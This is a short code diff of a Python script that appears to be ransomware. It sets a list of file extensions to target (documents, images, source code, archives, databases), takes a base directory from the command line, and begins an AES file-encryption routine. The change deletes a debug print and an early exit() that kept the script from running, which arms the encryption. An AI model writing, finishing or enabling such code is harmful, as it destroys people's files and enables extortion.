@@ -13,8 +13,6 @@ encryption_timeout = 120
 encrypted_symbol = "enc_"
 ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
 base_path = sys.argv[1]
-print("xxxxx: " + base_path)
-exit()
 
 def Encrypt(fileToEncrypt, iv, aes_obj):
     file_size = str(os.path.getsize(fileToEncrypt)).zfill(16)
